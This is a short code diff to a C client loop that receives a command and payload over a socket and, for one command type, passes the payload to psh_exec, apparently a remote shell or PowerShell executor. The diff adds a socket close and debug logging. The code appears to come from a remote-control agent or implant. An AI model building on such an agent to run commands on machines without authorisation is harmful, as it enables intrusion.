@@ -45,10 +45,12 @@ connect:
         // Getting initial command
         char* payload = (char*)safe_recv(sock, &cmd, NULL, 0);
         if (payload == NULL) {
+            CLOSE_SOCK(sock);
             goto connect; // Stupid 
         }
 
-        printf("Got cmd: %d\n", cmd);
+        printf("[DEBUG] Got cmd: %d\n", cmd);
+        printf("[DEBUG] Got payload: %s\n", payload);
 
         if (cmd == PSH_CMD) {
             psh_exec(sock, payload);
